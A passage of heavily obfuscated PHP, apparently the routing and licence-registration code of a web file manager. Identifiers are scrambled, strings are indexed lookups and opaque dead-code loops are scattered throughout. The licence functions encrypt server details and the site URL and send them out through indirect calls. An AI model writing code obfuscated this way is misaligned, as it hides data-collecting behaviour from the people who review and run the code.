$´Ï¯óºŞ[8] . ltrim($¨ÍùöøÙ, $´Ï¯óºŞ[8]); } public function getType() { $Ú˜«›Ì¯ =& $_SERVER[è¶³ÒßÑ]; $íôƒˆºê = str_replace($Ú˜«›Ì¯[87], $Ú˜«›Ì¯[12], get_class($this)); return strtolower($íôƒˆºê); } public function isOsDriver($ÜÓˆÇ—±) { return IO::isOsDriver($ÜÓˆÇ—±); } public function info($Æşà‰›‘) { return $this->infoParse($Æşà‰›‘); } public function infoAuth($›‘à¤¶‡) { return $this->infoParse($›‘à¤¶‡); } public function infoWithChildren($úÈ‰ºäÁ) { return $this->infoParse($úÈ‰ºäÁ, !0); } public function infoFull($·ØÓ¨–Ş) { return $this->infoParse($·ØÓ¨–Ş); } } goto d„¶ÌîŒÒ; dîÁğÂ÷: class Application { private $defaultModule = "\151\156\144\x65\x78"; private $defaultController = "\151\x6e\x64\x65\x78"; private $defaultAction = "\151\156\x64\145\x78"; function __construct() { } public function setDefault($«‘œ®ÈÓ) { $äëŠ¥ºÔ =& $_SERVER[è¶³ÒßÑ]; $…¤üèİÆ =& $_SERVER[çÛ›³ª²]; $¼€ÚˆÏË = explode($…¤üèİÆ[0], trim($«‘œ®ÈÓ, $…¤üèİÆ[0])); $‰±˜üÁô = $äëŠ¥ºÔ[676]; if (strlen($‰±˜üÁô) < $äëŠ¥ºÔ[677]) { return; } $this->defaultModule = $¼€ÚˆÏË[0] ? $¼€ÚˆÏË[0] : $this->defaultModule; $˜ÔŒàëê = $äëŠ¥ºÔ[678]; if (strlen($˜ÔŒàëê) < $äëŠ¥ºÔ[677]) { return; } $this->defaultController = $¼€ÚˆÏË[1] ? $¼€ÚˆÏË[1] : $this->defaultController; $this->defaultAction = $¼€ÚˆÏË[2] ? $¼€ÚˆÏË[2] : $this->defaultAction; $this->pocm4ee1859b($…¤üèİÆ[1], array($this, $…¤üèİÆ[2])); } public function appRun($ŠÇö¸ŸË) { $³Æ­Û„Õ =& $_SERVER[è¶³ÒßÑ]; $±­Æ§ÎÄ =& $_SERVER[çÛ›³ª²]; $÷æŸ¹Æà = explode($±­Æ§ÎÄ[0], $ŠÇö¸ŸË); $¤²êÎı³ = strtolower($÷æŸ¹Æà[0]); $»÷‹„´Ÿ = $³Æ­Û„Õ[679]; if (strlen($»÷‹„´Ÿ) < $³Æ­Û„Õ[680]) { die; } $âã†ˆê¢ = $±­Æ§ÎÄ[3]; $Áğ„×Ø‘ = $³Æ­Û„Õ[681]; if ($¤²êÎı³ == $±­Æ§ÎÄ[4]) { $âã†ˆê¢ = $±­Æ§ÎÄ[5]; $÷æŸ¹Æà[0] = $±­Æ§ÎÄ[6]; $÷æŸ¹Æà[1] = $÷æŸ¹Æà[1] . $±­Æ§ÎÄ[7]; $ŠÇö¸ŸË = join($±­Æ§ÎÄ[0], $÷æŸ¹Æà); $ŠÇö¸ŸË = trim($ŠÇö¸ŸË, $±­Æ§ÎÄ[0]); } call_user_func(array($±­Æ§ÎÄ[8], $±­Æ§ÎÄ[9]), $âã†ˆê¢ . $±­Æ§ÎÄ[10], $ŠÇö¸ŸË); ActionCall($ŠÇö¸ŸË); call_user_func(array($±­Æ§ÎÄ[8], $±­Æ§ÎÄ[9]), $âã†ˆê¢ . $±­Æ§ÎÄ[11], $ŠÇö¸ŸË); } private function autorun() { $É‘š±î =& $_SERVER[çÛ›³ª²]; global $config; $ÓÁ„å•« = $_SERVER[è¶³ÒßÑ][682]; if (!$ÓÁ„å•«) { die; } if (count($config[$É‘š±î[12]]) == 0) { return; } foreach ($config[$É‘š±î[12]] as $Ş…øÅ => $Áä¦³Ï¯) { $this->appRun($Áä¦³Ï¯); } } private function ksnvb74b0f42() { $ÁÓ”™¨È =& $_SERVER[è¶³ÒßÑ]; $ùáûøÛ =& $_SERVER[çÛ›³ª²]; $¤ÁèÌ¤ó = $ùáûøÛ[4]; $ïëƒŸ§˜ = $ÁÓ”™¨È[683]; while ($ïëƒŸ§˜ < $ÁÓ”™¨È[680]) { if ($ïëƒŸ§˜ >= 0) { break; } $ïëƒŸ§˜++; } $¡òûÙŠü = $GLOBALS[$ùáûøÛ[13]][$ùáûøÛ[14]][0]; if (!$¡òûÙŠü || strlen($¡òûÙŠü) <= strlen($¤ÁèÌ¤ó)) { return; } if (strtolower(substr($¡òûÙŠü, -strlen($¤ÁèÌ¤ó))) != $¤ÁèÌ¤ó) { return; } $ğ«æ•ø« = substr($¡òûÙŠü, 0, -strlen($¤ÁèÌ¤ó)); $À¨Î÷•™ = $ÁÓ”™¨È[684]; while (strlen($À¨Î÷•™) < $ÁÓ”™¨È[677]) { if (!$À¨Î÷•™) { break; } $À¨Î÷•™++; } $×ˆ­ÃÌâ = array($ùáûøÛ[4], $ğ«æ•ø«); $Å„ ®åî = array_slice($GLOBALS[$ùáûøÛ[13]][$ùáûøÛ[14]], 1); $ÎíôÄ¡ = $ÁÓ”™¨È[685]; $GLOBALS[$ùáûøÛ[13]][$ùáûøÛ[14]] = array_merge($×ˆ­ÃÌâ, $Å„ ®åî); $GLOBALS[$ùáûøÛ[13]][$ùáûøÛ[15]] = implode($ùáûøÛ[0], $GLOBALS[$ùáûøÛ[13]][$ùáûøÛ[14]]); $ñ‡¢™ïŠ = $ÁÓ”™¨È[686]; while (strlen($ñ‡¢™ïŠ) < $ÁÓ”™¨È[687]) { if (!$ñ‡¢™ïŠ) { break; } $ñ‡¢™ïŠ++; } } private function sqgbc5c6f1a4() { $ĞÚé…ƒ” =& $_SERVER[çÛ›³ª²]; if ($GLOBALS[$ĞÚé…ƒ”[13]][$ĞÚé…ƒ”[15]] != $ĞÚé…ƒ”[6]) { return; } $’—ò¾³Ö = $_SERVER[$ĞÚé…ƒ”[16]]; $¨åÓ¼Úã = $_SERVER[è¶³ÒßÑ][688]; $şİ°î¢û = $ĞÚé…ƒ”[17]; if (!strstr($’—ò¾³Ö, $şİ°î¢û)) { return; } $±á°±“õ = strrpos($’—ò¾³Ö, $şİ°î¢û); $ªé¡ŞÑ— = substr($’—ò¾³Ö, $±á°±“õ + strlen($şİ°î¢û)); preg_match_all($ĞÚé…ƒ”[18], $ªé¡ŞÑ—, $ãøÔÏÅ); $ªé¡ŞÑ— = trim($ãøÔÏÅ[0][0], $ĞÚé…ƒ”[19]); $GLOBALS[$ĞÚé…ƒ”[13]][$ĞÚé…ƒ”[14]] = explode($ĞÚé…ƒ”[19], $ªé¡ŞÑ—); $GLOBALS[$ĞÚé…ƒ”[13]][$ĞÚé…ƒ”[15]] = implode($ĞÚé…ƒ”[0], $GLOBALS[$ĞÚé…ƒ”[13]][$ĞÚé…ƒ”[14]]); } public function run() { $ü±€ú©ı =& $_SERVER[è¶³ÒßÑ]; $¸Ğ”÷ŠÏ =& $_SERVER[çÛ›³ª²]; $this->sqgbc5c6f1a4(); $ª¢Ï´–Ÿ = $ü±€ú©ı[689]; while ($ª¢Ï´–Ÿ < $ü±€ú©ı[61]) { if ($ª¢Ï´–Ÿ >= 0) { break; } $ª¢Ï´–Ÿ++; } $this->ksnvb74b0f42(); $ûõÎ£Ï = $GLOBALS[$¸Ğ”÷ŠÏ[13]][$¸Ğ”÷ŠÏ[14]]; $¨Ÿë… = $ü±€ú©ı[690]; if (!$¨Ÿë…) { die; } $Ô§»šÈë = $GLOBALS[$¸Ğ”÷ŠÏ[13]][$¸Ğ”÷ŠÏ[15]]; define($¸Ğ”÷ŠÏ[20], isset($ûõÎ£Ï[0]) && $ûõÎ£Ï[0] ? $ûõÎ£Ï[0] : $this->defaultModule); define($¸Ğ”÷ŠÏ[21], isset($ûõÎ£Ï[1]) && $ûõÎ£Ï[0] ? $ûõÎ£Ï[1] : $this->defaultController); $÷£¤Íî = $ü±€ú©ı[691]; define($¸Ğ”÷ŠÏ[22], isset($ûõÎ£Ï[2]) && $ûõÎ£Ï[0] ? $ûõÎ£Ï[2] : $this->defaultAction); define($¸Ğ”÷ŠÏ[23], MOD . $¸Ğ”÷ŠÏ[0] . ST . $¸Ğ”÷ŠÏ[0] . ACT); $‰©Ÿ­Î™ = $ü±€ú©ı[692]; if (strlen($‰©Ÿ­Î™) < $ü±€ú©ı[680]) { die; } $_SERVER[$¸Ğ”÷ŠÏ[24]] = strtolower(ACTION); $this->autorun(); if (count($ûõÎ£Ï) >= 3) { $this->appRun($Ô§»šÈë); } else { $this->appRun(ACTION); } } private $fpqr80a73378 = array(); private $laend5ca65a9 = ''; public function mqhu1c0b282a() { $Îø¿é­­ =& $_SERVER[è¶³ÒßÑ]; $õãøã =& $_SERVER[çÛ›³ª²]; $this->jmkt86756408(); $ñÈ½µâŠ = $Îø¿é­­[693]; if (!$ñÈ½µâŠ) { return; } $this->tigu081d1381(); $this->gqks4e16228d(); $this->euihfeccfe80(); $this->sxgbc4ce8293(); $this->jvck41288704(); $this->ioet395ce323(); $äûâµ¶· = $Îø¿é­­[694]; if (!$äûâµ¶·) { return; } $this->pocm4ee1859b($õãøã[25], array($this, $õãøã[26])); $this->pocm4ee1859b($õãøã[27], array($this, $õãøã[28])); $Øèõ×¹ = $Îø¿é­­[695]; if (!$Øèõ×¹) { return; } $this->pocm4ee1859b($õãøã[29], array($this, $õãøã[30])); $this->pocm4ee1859b($õãøã[31], array($this, $õãøã[32])); } public function diul1e699d39($øÆÕ•Ô®) { $ùâËÓ‹¬ =& $_SERVER[è¶³ÒßÑ]; $ö‰óÌéı =& $_SERVER[çÛ›³ª²]; $Üì©ÜÁ = Model($ö‰óÌéı[33])->get(); $ìøÌ¢ß = $ùâËÓ‹¬[696]; while (strlen($ìøÌ¢ß) < $ùâËÓ‹¬[697]) { if (!$ìøÌ¢ß) { break; } $ìøÌ¢ß++; } $î‹ãŸ®Ğ = array($ö‰óÌéı[34], $ö‰óÌéı[35], $ö‰óÌéı[36], $ö‰óÌéı[37], $ö‰óÌéı[38], $ö‰óÌéı[39], $ö‰óÌéı[40], $ö‰óÌéı[41], $ö‰óÌéı[42], $ö‰óÌéı[43], $ö‰óÌéı[44], $ö‰óÌéı[45], $ö‰óÌéı[46], $ö‰óÌéı[47], $ö‰óÌéı[48], $ö‰óÌéı[49], $ö‰óÌéı[50], $ö‰óÌéı[51], $ö‰óÌéı[52], $ö‰óÌéı[53], $ö‰óÌéı[54], $ö‰óÌéı[55], $ö‰óÌéı[56], $ö‰óÌéı[57], $ö‰óÌéı[58], $ö‰óÌéı[59], $ö‰óÌéı[60], $ö‰óÌéı[61], $ö‰óÌéı[62], $ö‰óÌéı[63], $ö‰óÌéı[64], $ö‰óÌéı[65], $ö‰óÌéı[66], $ö‰óÌéı[67], $ö‰óÌéı[68], $ö‰óÌéı[69], $ö‰óÌéı[70], $ö‰óÌéı[71], $ö‰óÌéı[72], $ö‰óÌéı[73], $ö‰óÌéı[74], $ö‰óÌéı[75], $ö‰óÌéı[76], $ö‰óÌéı[77], $ö‰óÌéı[78], $ö‰óÌéı[79], $ö‰óÌéı[80], $ö‰óÌéı[81], $ö‰óÌéı[82], $ö‰óÌéı[83], $ö‰óÌéı[84], $ö‰óÌéı[85]); $Ã»ìÉìÏ = $ùâËÓ‹¬[698]; if (strlen($Ã»ìÉìÏ) < $ùâËÓ‹¬[61]) { die; } foreach ($î‹ãŸ®Ğ as $ùÒ‹ïŸæ) { $ˆÊ€Ó¡ = $GLOBALS[$ö‰óÌéı[86]][$ö‰óÌéı[87]][$ùÒ‹ïŸæ]; $ş›ï«×è = $ùâËÓ‹¬[699]; if (strlen($ş›ï«×è) < $ùâËÓ‹¬[677]) { return; } if (isset($Üì©ÜÁ[$ùÒ‹ïŸæ])) { $ˆÊ€Ó¡ = $Üì©ÜÁ[$ùÒ‹ïŸæ]; } $øÆÕ•Ô®[$ö‰óÌéı[88]][$ö‰óÌéı[89]][$ùÒ‹ïŸæ] = $ˆÊ€Ó¡; } $¶ÄöÈô = $øÆÕ•Ô®[$ö‰óÌéı[88]][$ö‰óÌéı[89]][$ö‰óÌéı[46]]; $‹ó’ç = $ùâËÓ‹¬[700]; unset($øÆÕ•Ô®[$ö‰óÌéı[88]][$ö‰óÌéı[90]][$ö‰óÌéı[91]]); $ÅâË®å = $ùâËÓ‹¬[701]; if (!$ÅâË®å) { return; } unset($øÆÕ•Ô®[$ö‰óÌéı[88]][$ö‰óÌéı[90]][$ö‰óÌéı[92]]); $§æœªŠ = $ùâËÓ‹¬[702]; if (strlen($§æœªŠ) < $ùâËÓ‹¬[680]) { die; } unset($øÆÕ•Ô®[$ö‰óÌéı[88]][$ö‰óÌéı[89]][$ö‰óÌéı[46]]); $Ãúâ‡·à = $ùâËÓ‹¬[703]; while ($Ãúâ‡·à < $ùâËÓ‹¬[687]) { if ($Ãúâ‡·à >= 0) { break; } $Ãúâ‡·à++; } unset($øÆÕ•Ô®[$ö‰óÌéı[88]][$ö‰óÌéı[89]][$ö‰óÌéı[93]]); $øÆÕ•Ô®[$ö‰óÌéı[88]][$ö‰óÌéı[89]][$ö‰óÌéı[94]] = array($ö‰óÌéı[95] => (int) $¶ÄöÈô[$ö‰óÌéı[96]], $ö‰óÌéı[97] => (int) _get($¶ÄöÈô, $ö‰óÌéı[98], 0)); $Ò®àŸøö = substr(md5($ö‰óÌéı[99] . get_client_ip() . $Üì©ÜÁ[$ö‰óÌéı[100]]), 0, 15); $øÆÕ•Ô®[$ö‰óÌéı[101]][$ö‰óÌéı[102]] = Mcrypt::encode(Session::sign(), $Ò®àŸøö, 3600 * 24); $øÆÕ•Ô®[$ö‰óÌéı[101]][$ö‰óÌéı[103]] = Action($ö‰óÌéı[104])->accessToken(); $ÑÔö•Ë = $ùâËÓ‹¬[704]; if (strlen($ÑÔö•Ë) < $ùâËÓ‹¬[697]) { return; } $øÆÕ•Ô®[$ö‰óÌéı[101]][$ö‰óÌéı[105]] = md5($_SERVER[$ö‰óÌéı[106]] . $Üì©ÜÁ[$ö‰óÌéı[100]]); $ñéêÍ×Ù = $ùâËÓ‹¬[705]; if (strlen($ñéêÍ×Ù) < $ùâËÓ‹¬[677]) { return; } $øÆÕ•Ô®[$ö‰óÌéı[101]][$ö‰óÌéı[107]] = base64_encode(serverInfo()); $øÆÕ•Ô®[$ö‰óÌéı[101]][$ö‰óÌéı[108]] = $this->laend5ca65a9; if ($Üì©ÜÁ[$ö‰óÌéı[108]] != $ö‰óÌéı[109]) { $øÆÕ•Ô®[$ö‰óÌéı[101]][$ö‰óÌéı[110]] = $Üì©ÜÁ[$ö‰óÌéı[110]]; $øÆÕ•Ô®[$ö‰óÌéı[101]][$ö‰óÌéı[111]] = $Üì©ÜÁ[$ö‰óÌéı[111]]; $é•ÍõÊª = rand_string(10) . $this->laend5ca65a9 . rand_string(5); $øÆÕ•Ô®[$ö‰óÌéı[88]][$ö‰óÌéı[112]][$ö‰óÌéı[113]] = $this->mrei33d87cda($é•ÍõÊª, $øÆÕ•Ô®[$ö‰óÌéı[101]][$ö‰óÌéı[105]]); } if ($this->laend5ca65a9 == $ö‰óÌéı[109]) { $øÆÕ•Ô®[$ö‰óÌéı[88]][$ö‰óÌéı[89]][$ö‰óÌéı[94]][$ö‰óÌéı[98]] = 0; } $øÆÕ•Ô®[$ö‰óÌéı[101]][$ö‰óÌéı[114]] = $this->versionPluginFilter(); $øÆÕ•Ô®[$ö‰óÌéı[101]][$ö‰óÌéı[115]] = _get($this->fpqr80a73378, $ö‰óÌéı[116], $ö‰óÌéı[6]); $·ú”Ä¦Ã = $ùâËÓ‹¬[706]; if (!$·ú”Ä¦Ã) { die; } if (KodUser::isRoot() && $this->config[$ö‰óÌéı[117]]) { $øÆÕ•Ô®[$ö‰óÌéı[101]][$ö‰óÌéı[118]] = WEB_ROOT; } return $øÆÕ•Ô®; } private function jvck41288704() { $ØÈËë•ß =& $_SERVER[è¶³ÒßÑ]; $•ÑÜ€¾ó =& $_SERVER[çÛ›³ª²]; $ô‚¦÷‡‚ = $_SERVER[$•ÑÜ€¾ó[24]] == $•ÑÜ€¾ó[119]; $¼£ï“˜¿ = $ØÈËë•ß[707]; while (strlen($¼£ï“˜¿) < $ØÈËë•ß[697]) { if (!$¼£ï“˜¿) { break; } $¼£ï“˜¿++; } if ($_SERVER[$•ÑÜ€¾ó[24]] == $•ÑÜ€¾ó[120] && $_GET[$•ÑÜ€¾ó[121]] == $•ÑÜ€¾ó[122]) { $ô‚¦÷‡‚ = !0; } if ($ô‚¦÷‡‚) { $³Ë”™é‚ = array($•ÑÜ€¾ó[108] => $this->laend5ca65a9, $•ÑÜ€¾ó[123] => $this->hmpfa6d795c1(), $•ÑÜ€¾ó[124] => Model($•ÑÜ€¾ó[125])->count()); if ($this->laend5ca65a9 != $•ÑÜ€¾ó[109]) { $§è–§ñ = _get($this->fpqr80a73378, $•ÑÜ€¾ó[126]); if ($§è–§ñ) { $³Ë”™é‚[$•ÑÜ€¾ó[127]] = $§è–§ñ; $³Ë”™é‚[$•ÑÜ€¾ó[128]] = strtotime(_get($this->fpqr80a73378, $•ÑÜ€¾ó[129])); $³Ë”™é‚[$•ÑÜ€¾ó[130]] = _get($this->fpqr80a73378, $•ÑÜ€¾ó[116]); } $úıÔ¹ÑÅ = Model($•ÑÜ€¾ó[33])->get($•ÑÜ€¾ó[131], $•ÑÜ€¾ó[6], !0); if (is_string($úıÔ¹ÑÅ) && substr($úıÔ¹ÑÅ, 0, 1) == $•ÑÜ€¾ó[132]) { $úıÔ¹ÑÅ = json_decode_force($úıÔ¹ÑÅ); } if (is_array($úıÔ¹ÑÅ) && $úıÔ¹ÑÅ[$•ÑÜ€¾ó[133]] && strstr($úıÔ¹ÑÅ[$•ÑÜ€¾ó[133]], $•ÑÜ€¾ó[134])) { $³ÀîÑÌ§ = explode($•ÑÜ€¾ó[134], $úıÔ¹ÑÅ[$•ÑÜ€¾ó[133]]); $³Ë”™é‚[$•ÑÜ€¾ó[135]] = $³ÀîÑÌ§[0]; } } $³Ë”™é‚ = $this->vocr0aaa5376(json_encode($³Ë”™é‚), md5($•ÑÜ€¾ó[136])); $Ã›€¸Ö™ = $ØÈËë•ß[708]; if (!$Ã›€¸Ö™) { return; } $Ó »Ç‹Ï = array($•ÑÜ€¾ó[137] => $³Ë”™é‚); $ìü‰…“§ = $ØÈËë•ß[709]; while (strlen($ìü‰…“§) < $ØÈËë•ß[677]) { if (!$ìü‰…“§) { break; } $ìü‰…“§++; } call_user_func(array($•ÑÜ€¾ó[138], $•ÑÜ€¾ó[139]), $Ó »Ç‹Ï); } if ($this->laend5ca65a9 == $•ÑÜ€¾ó[109]) { return; } $ºç¯Öêš = array($•ÑÜ€¾ó[140], $•ÑÜ€¾ó[141], $•ÑÜ€¾ó[142], $•ÑÜ€¾ó[143], $•ÑÜ€¾ó[144], $•ÑÜ€¾ó[145]); $Ù÷•Ï€ = Model($•ÑÜ€¾ó[33])->get(); $åµÇ‹üœ = $ØÈËë•ß[710]; while (strlen($åµÇ‹üœ) < $ØÈËë•ß[677]) { if (!$åµÇ‹üœ) { break; } $åµÇ‹üœ++; } $Ó »Ç‹Ï = array($•ÑÜ€¾ó[146] => $Ù÷•Ï€[$•ÑÜ€¾ó[34]], $•ÑÜ€¾ó[147] => $Ù÷•Ï€[$•ÑÜ€¾ó[35]], $•ÑÜ€¾ó[148] => $•ÑÜ€¾ó[6]); $¾ÂÛ‡¼ = $ØÈËë•ß[711]; if (!$¾ÂÛ‡¼) { return; } foreach ($ºç¯Öêš as $»Æš¶ŠÂ) { if (!isset($Ù÷•Ï€[$»Æš¶ŠÂ]) || !$Ù÷•Ï€[$»Æš¶ŠÂ]) { continue; } $Ó »Ç‹Ï[$»Æš¶ŠÂ] = $Ù÷•Ï€[$»Æš¶ŠÂ]; $–«²ŠŸ“ = $ØÈËë•ß[706]; while ($–«²ŠŸ“ < $ØÈËë•ß[687]) { if ($–«²ŠŸ“ >= 0) { break; } $–«²ŠŸ“++; } } call_user_func(array($•ÑÜ€¾ó[138], $•ÑÜ€¾ó[139]), $Ó »Ç‹Ï); $Ã”øÅåı = $ØÈËë•ß[712]; if (!$Ã”øÅåı) { die; } } private function euihfeccfe80() { $Ô–ÇÇĞè =& $_SERVER[è¶³ÒßÑ]; $µ¦÷ûøÎ =& $_SERVER[çÛ›³ª²]; if ($_SERVER[$µ¦÷ûøÎ[24]] != $µ¦÷ûøÎ[149]) { return; } if (!KodUser::isRoot()) { die; } $ÓÊªâµÌ = $GLOBALS[$µ¦÷ûøÎ[13]]; if (isset($ÓÊªâµÌ[$µ¦÷ûøÎ[150]])) { $this->gloja5733ef9(); die; } if (isset($ÓÊªâµÌ[$µ¦÷ûøÎ[151]]) && isset($ÓÊªâµÌ[$µ¦÷ûøÎ[151]]) == $µ¦÷ûøÎ[122]) { $ÓÊªâµÌ[$µ¦÷ûøÎ[152]] = Model($µ¦÷ûøÎ[33])->get($µ¦÷ûøÎ[153]); } if (!isset($ÓÊªâµÌ[$µ¦÷ûøÎ[152]]) || strlen($ÓÊªâµÌ[$µ¦÷ûøÎ[152]]) != 16) { show_json($µ¦÷ûøÎ[154] . $ÓÊªâµÌ[$µ¦÷ûøÎ[152]], !1); } $­œ¸ËÁ– = Model($µ¦÷ûøÎ[33])->get($µ¦÷ûøÎ[100]); $Çˆ™º¨İ = md5($_SERVER[$µ¦÷ûøÎ[106]] . $­œ¸ËÁ–); $°†ŒâîÜ = array($µ¦÷ûøÎ[152] => $ÓÊªâµÌ[$µ¦÷ûøÎ[152]], $µ¦÷ûøÎ[155] => rand_string(16), $µ¦÷ûøÎ[156] => $µ¦÷ûøÎ[136], $µ¦÷ûøÎ[157] => $µ¦÷ûøÎ[158], $µ¦÷ûøÎ[159] => $_SERVER[$µ¦÷ûøÎ[160]], $µ¦÷ûøÎ[161] => $_SERVER[$µ¦÷ûøÎ[162]], $µ¦÷ûøÎ[163] => $_SERVER[$µ¦÷ûøÎ[164]], $µ¦÷ûøÎ[105] => $Çˆ™º¨İ, $µ¦÷ûøÎ[165] => Model($µ¦÷ûøÎ[33])->get($µ¦÷ûøÎ[131])); if (isset($ÓÊªâµÌ[$µ¦÷ûøÎ[151]]) && isset($ÓÊªâµÌ[$µ¦÷ûøÎ[151]]) == $µ¦÷ûøÎ[122]) { $°†ŒâîÜ[$µ¦÷ûøÎ[151]] = md5($°†ŒâîÜ[$µ¦÷ûøÎ[152]] . $µ¦÷ûøÎ[166] . $°†ŒâîÜ[$µ¦÷ûøÎ[155]]); } if ($ÓÊªâµÌ[$µ¦÷ûøÎ[167]] == $µ¦÷ûøÎ[168]) { $À·ÛèÄ» = $this->vocr0aaa5376($Çˆ™º¨İ, $µ¦÷ûøÎ[169]); $äáü = $this->mrei33d87cda(json_encode($°†ŒâîÜ), $Çˆ™º¨İ . $µ¦÷ûøÎ[170], 3); $äáü = $äáü . $µ¦÷ûøÎ[171] . $_SERVER[$µ¦÷ûøÎ[160]]; $¬òÚ°ê’ = $this->ucvt0c3478e7($µ¦÷ûøÎ[172] . $À·ÛèÄ» . $µ¦÷ûøÎ[173] . $äáü, -1); show_json($¬òÚ°ê’, !0); } else { if ($ÓÊªâµÌ[$µ¦÷ûøÎ[167]] == $µ¦÷ûøÎ[174]) { $øŠ´‹À = substr(md5($µ¦÷ûøÎ[175] . $Çˆ™º¨İ), 12, 15) . $µ¦÷ûøÎ[176]; $äáü = $this->gzvq77b5035b(trim($ÓÊªâµÌ[$µ¦÷ûøÎ[177]]), $øŠ´‹À, 2); $‚›¹ÉŸç = json_decode($äáü, !0); if (!is_array($‚›¹ÉŸç) || !is_array($‚›¹ÉŸç[$µ¦÷ûøÎ[178]]) || $‚›¹ÉŸç[$µ¦÷ûøÎ[152]] != !0) { $™Çç®²§ = $µ¦÷ûøÎ[179]; $¾³ ’—Ü = $‚›¹ÉŸç[$µ¦÷ûøÎ[178]] ? $µ¦÷ûøÎ[180] . $‚›¹ÉŸç[$µ¦÷ûøÎ[178]] : $™Çç®²§; show_json($¾³ ’—Ü, !1); } else { $°†ŒâîÜ[$µ¦÷ûøÎ[155]] = $‚›¹ÉŸç[$µ¦÷ûøÎ[178]][$µ¦÷ûøÎ[181]]; } } else { $‚›¹ÉŸç = $this->ucvt0c3478e7($µ¦÷ûøÎ[182], $°†ŒâîÜ, 10); } } if (!is_array($‚›¹ÉŸç) || !is_array($‚›¹ÉŸç[$µ¦÷ûøÎ[178]]) || $‚›¹ÉŸç[$µ¦÷ûøÎ[152]] != !0) { $™Çç®²§ = LNG($µ¦÷ûøÎ[183]); $¾³ ’—Ü = $‚›¹ÉŸç[$µ¦÷ûøÎ[178]] ? $µ¦÷ûøÎ[180] . $‚›¹ÉŸç[$µ¦÷ûøÎ[178]] : $™Çç®²§; show_json($¾³ ’—Ü, !1); } $»¡¬ìÔ = $‚›¹ÉŸç[$µ¦÷ûøÎ[178]]; $†İ¦‹… = $this->wncv38298012($»¡¬ìÔ[$µ¦÷ûøÎ[184]]); if (!$†İ¦‹… || $†İ¦‹… != $»¡¬ìÔ[$µ¦÷ûøÎ[129]]) { $‚ñ×Î¯ı = array($µ¦÷ûøÎ[185] => Model($µ¦÷ûøÎ[33])->get($µ¦÷ûøÎ[100]), $µ¦÷ûøÎ[186] => $_SERVER[$µ¦÷ûøÎ[106]], $µ¦÷ûøÎ[187] => this_url(), $µ¦÷ûøÎ[161] => $_SERVER[$µ¦÷ûøÎ[162]]); $äáü = $this->trcia2b20953(json_encode($‚ñ×Î¯ı)); $this->ucvt0c3478e7($µ¦÷ûøÎ[188] . $äáü); show_json(LNG($µ¦÷ûøÎ[189]), !0); } $™ƒ—Ò•à = array($µ¦÷ûøÎ[153] => $»¡¬ìÔ[$µ¦÷ûøÎ[190]], $µ¦÷ûøÎ[191] => $»¡¬ìÔ[$µ¦÷ûøÎ[192]], $µ¦÷ûøÎ[193] => rand_string(16), $µ¦÷ûøÎ[108] => $»¡¬ìÔ[$µ¦÷ûøÎ[194]]); if ($°†ŒâîÜ[$µ¦÷ûøÎ[155]]) { $™ƒ—Ò•à[$µ¦÷ûøÎ[193]] = $°†ŒâîÜ[$µ¦÷ûøÎ[155]]; } $ö¸ƒ‰…Ô = substr(md5($™ƒ—Ò•à[$µ¦÷ûøÎ[191]]), 10, 10); $Ì€àÏó² = $ö¸ƒ‰…Ô . $™ƒ—Ò•à[$µ¦÷ûøÎ[108]] . $™ƒ—Ò•à[$µ¦÷ûøÎ[193]]; $çÏÈ“ô÷ = $Ô–ÇÇĞè[713]; if (!$çÏÈ“ô÷) { die; } $™ƒ—Ò•à[$µ¦÷ûøÎ[110]] = strrev(base64_encode($this->vocr0aaa5376($Ì€àÏó², $µ¦÷ûøÎ[195]))); $û‰ñêÄ = rand_string(16); $–ë¿¡ıÚ = $Ô–ÇÇĞè[714]; if (!$–ë¿¡ıÚ) { return; } $Í‚Õ’é« = $û‰ñêÄ . $™ƒ—Ò•à[$µ¦÷ûøÎ[108]] . $this->vocr0aaa5376(md5($™ƒ—Ò•à[$µ¦÷ûøÎ[153]]), $û‰ñêÄ); $™ƒ—Ò•à[$µ¦÷ûøÎ[111]] = base64_encode(strrev($this->vocr0aaa5376($Í‚Õ’é«, $µ¦÷ûøÎ[196]))); $œ±¦‡ = $Ô–ÇÇĞè[715]; while ($œ±¦‡ < $Ô–ÇÇĞè[687]) { if ($œ±¦‡ >= 0) { break; } $œ±¦‡++; } if ($»¡¬ìÔ[$µ¦÷ûøÎ[197]] && $»¡¬ìÔ[$µ¦÷ûøÎ[197]] >= 1) { Model($µ¦÷ûøÎ[33])->setDeep($µ¦÷ûøÎ[198], $µ¦÷ûøÎ[122]); } Model($µ¦÷ûøÎ[33])->set($™ƒ—Ò•à); $ Ôøüğ´ = md5($_SERVER[$µ¦÷ûøÎ[106]] . strrev($­œ¸ËÁ–) . $™ƒ—Ò•à[$µ¦÷ûøÎ[191]]); $÷‘¥Ãû¹ = $Ô–ÇÇĞè[716]; if (!$÷‘¥Ãû¹) { return; } $¨î†ÃòÑ = strrev(substr($ Ôøüğ´, 10, 16)); $¥²à”¬® = $Ô–ÇÇĞè[717]; while ($¥²à”¬® < $Ô–ÇÇĞè[687]) { if ($¥²à”¬® >= 0) { break; } $¥²à”¬®++; } $Ô‰é“´© = $this->mrei33d87cda(json_encode($»¡¬ìÔ), $ Ôøüğ´); $ÀîŒÎ¹ú = $Ô–ÇÇĞè[718]; while ($ÀîŒÎ¹ú < $Ô–ÇÇĞè[61]) { if ($ÀîŒÎ¹ú >= 0) { break; } $ÀîŒÎ¹ú++; } $åõ‚Â¼ø = array_to_keyvalue(Model($µ¦÷ûøÎ[7])->listData(), $µ¦÷ûøÎ[199]); $óì¼’¦Å = $åõ‚Â¼ø[$µ¦÷ûøÎ[200]]; $Ó”‰ÂŒı = array(); $Ó”‰ÂŒı[$¨î†ÃòÑ] = $Ô‰é“´©; Model($µ¦÷ûøÎ[7])->update($óì¼’¦Å[$µ¦÷ûøÎ[201]], array($µ¦÷ûøÎ[202] => $Ó”‰ÂŒı)); $¿•×‹Ø‰ = $Ô–ÇÇĞè[719]; while ($¿•×‹Ø‰ < $Ô–ÇÇĞè[677]) { if ($¿•×‹Ø‰ >= 0) { break; } $¿•×‹Ø‰++; } $this->fpqr80a73378 = $»¡¬ìÔ; $Ø²²ÃÚ© = $Ô–ÇÇĞè[720]; if (!$Ø²²ÃÚ©) { return; } $this->laend5ca65a9 = $™ƒ—Ò•à[$µ¦÷ûøÎ[108]]; $´¼Å—’ = $Ô–ÇÇĞè[721]; if (strlen($´¼Å—’) < $Ô–ÇÇĞè[677]) { die; } $this->licenseRegistSuccess(); $ÑÌÑ’‡‹ = $Ô–ÇÇĞè[722]; if (!$ÑÌÑ’‡‹) { die; } Cache::set($µ¦÷ûøÎ[203] . md5($­œ¸ËÁ– . $µ¦÷ûøÎ[204]), 